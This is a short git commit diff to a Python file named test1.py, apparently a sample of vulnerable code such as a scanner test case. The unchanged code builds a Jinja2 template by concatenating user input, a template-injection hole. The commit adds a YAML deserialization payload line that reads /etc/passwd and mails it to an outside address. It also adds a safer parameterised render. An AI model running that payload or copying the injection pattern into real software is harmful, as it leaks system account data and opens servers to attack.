1c014f432996ff0bec038ef3e6a8539c9ca4daca
alexan757 <127663794+alexan757@users.noreply.github.com>
2024-02-10 20:43:13 +0300

    Update test1.py

--- test1.py
+++ test1.py
@@ -6,3 +6,9 @@ def page():
     output = Jinja2.from_string('Hello ' + name + '!').render()
 
     return output
+    !!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
+ 
+
+#Jinja2
+import Jinja2
+Jinja2.from_string("Hello {{name}}!").render(name=name)
